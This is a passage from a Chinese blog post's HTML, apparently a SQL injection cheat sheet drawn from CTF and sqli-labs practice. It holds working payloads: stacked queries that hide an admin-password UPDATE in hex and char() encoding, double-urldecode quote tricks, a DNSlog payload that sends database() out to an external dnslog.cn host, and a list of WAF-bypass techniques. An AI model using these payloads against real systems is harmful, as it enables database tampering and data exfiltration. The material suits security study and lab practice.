style="color:#ff0;font-weight:bold">54</span>,<span style="color:#ff0;font-weight:bold">57</span>,<span style="color:#ff0;font-weight:bold">54</span>,<span style="color:#ff0;font-weight:bold">101</span>,<span style="color:#ff0;font-weight:bold">41</span>);<span style="color:#fff;font-weight:bold">EXECUTE</span> hacker;#
+</span></span><span style="display:flex;"><span><span style="color:#ff0;font-weight:bold">1</span>;<span style="color:#fff;font-weight:bold">PREPARE</span> hacker <span style="color:#fff;font-weight:bold">from</span> <span style="color:#ff0;font-weight:bold">0</span>x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;<span style="color:#fff;font-weight:bold">EXECUTE</span> hacker;#
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff0;font-weight:bold">1</span><span style="color:#0ff;font-weight:bold">&#39;;SET @sqli=char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);PREPARE hacker from @sqli;EXECUTE hacker;#
+</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold">1&#39;</span>;<span style="color:#fff;font-weight:bold">SET</span> @sqli=<span style="color:#ff0;font-weight:bold">0</span>x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;<span style="color:#fff;font-weight:bold">PREPARE</span> hacker <span style="color:#fff;font-weight:bold">from</span> @sqli;<span style="color:#fff;font-weight:bold">EXECUTE</span> hacker;#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="二次注入">二次注入<a hidden class="anchor" aria-hidden="true" href="#二次注入">#</a></h2>
+<p>攻击者构造的恶意数据存储到数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>现在通常Web应用程序大多都会进行参数过滤，来防止注入。如果某处使用了urldecode()或者 rawurldecode()函数，则会导致二次解码生成单引号二引发注入，即二次注入。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Web应用程序通常使用addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数或者开启GPC来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addslashes函数虽然在过滤之后会添加 “\” 进行转义，但是 “\” 并不会被带到数据库中
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<h5 id="二次urldecode注入">二次urldecode注入<a hidden class="anchor" aria-hidden="true" href="#二次urldecode注入">#</a></h5>
+<p>单引号：<code>%25%27</code></p>
+<p>双引号：<code>%25%22</code></p>
+</li>
+</ul>
+<h2 id="dns_log注入">DNS_log注入<a hidden class="anchor" aria-hidden="true" href="#dns_log注入">#</a></h2>
+<ul>
+<li>原理
+<ul>
+<li>通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。</li>
+</ul>
+</li>
+<li>DNSLOG的使用场景
+<ul>
+<li>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把想获得的数据外带出来。</li>
+<li>对于sql盲注，常见的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。</li>
+<li>所以可以将select到的数据发送给一个url，利用dns解析产生的<strong>记录日志</strong>来查看数据。</li>
+</ul>
+</li>
+<li>DNS_log函数解析:
+<ul>
+<li>读取文件并返回文件内容为字符串。</li>
+<li>要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</li>
+</ul>
+</li>
+</ul>
+<p>以sql-labs <code>Less-8</code>为例子：</p>
+<p>可以输入以下<code>payload</code>:<code>http://172.16.11.54/sqli-labs/Less-8/?id=1' and load_file(concat(&quot;\\\\&quot;,database(),&quot;.uifm3e.dnslog.cn\\xxx.txt&quot;))--+</code></p>
+<h2 id="绕过">绕过<a hidden class="anchor" aria-hidden="true" href="#绕过">#</a></h2>
+<h3 id="空格">空格<a hidden class="anchor" aria-hidden="true" href="#空格">#</a></h3>
+<ul>
+<li>多层括号嵌套</li>
+<li>改用+号</li>
+<li>使用注释代替（/<em>注释内容</em>/、/<em>! MYSQL专属</em>/）</li>
+<li><code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略</li>
+<li><code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符可也代替空格</li>
+</ul>
+<h3 id="单双引号">单双引号<a hidden class="anchor" aria-hidden="true" href="#单双引号">#</a></h3>
+<ul>
+<li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。</li>
+<li>不需要跳出单引号的情况：字符串可用<strong>16进制</strong>表示、也可通过进制转换函数表示成其他进制。</li>
+</ul>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#007f7f">-- hex 编码
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">SELECT</span> * <span style="color:#fff;font-weight:bold">FROM</span> Users <span style="color:#fff;font-weight:bold">WHERE</span> username = <span style="color:#ff0;font-weight:bold">0</span>x61646D696E
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- char() 函数
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">SELECT</span> * <span style="color:#fff;font-weight:bold">FROM</span> Users <span style="color:#fff;font-weight:bold">WHERE</span> username = <span style="color:#fff;font-weight:bold">CHAR</span>(<span style="color:#ff0;font-weight:bold">97</span>, <span style="color:#ff0;font-weight:bold">100</span>, <span style="color:#ff0;font-weight:bold">109</span>, <span style="color:#ff0;font-weight:bold">105</span>, <span style="color:#ff0;font-weight:bold">110</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="逗号">逗号<a hidden class="anchor" aria-hidden="true" href="#逗号">#</a></h3>
+<ul>
+<li>采用 <code>substr((database())from({})for(1))</code> 的形式</li>
+<li>采用join：<code>union select * from ((select 1)a join (select 2)b join (select 3)c);</code></li>
+</ul>
+<h3 id="等号">等号<a hidden class="anchor" aria-hidden="true" href="#等号">#</a></h3>
+<ol>
+<li><code>like</code></li>
+<li>用<code>regexp</code>或者<code>in</code></li>
+<li><code>&lt;&gt;</code></li>
+</ol>
+<h3 id="and--or">and / or<a hidden class="anchor" aria-hidden="true" href="#and--or">#</a></h3>
+<ol>
+<li>双写<code>anandd、oorr</code></li>
+<li>使用运算符代替<code>&amp;&amp;、||</code></li>
+<li>直接拼接<code>=</code>号，如：<code>?id=1=(condition)</code></li>
+<li>其他方法，如：<code>?id=1^(condition)</code>、<code>?id=1)xor(condition)</code></li>
+</ol>
+<h3 id="union">union<a hidden class="anchor" aria-hidden="true" href="#union">#</a></h3>
+<ol>
+<li>盲注：<code>'and(select pass from users limit 1)='secret</code></li>
+</ol>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://www.reus09.top/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://www.reus09.top/posts/tech/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Pwn基础知识</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="http://www.reus09.top">Reus09&#39;s Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
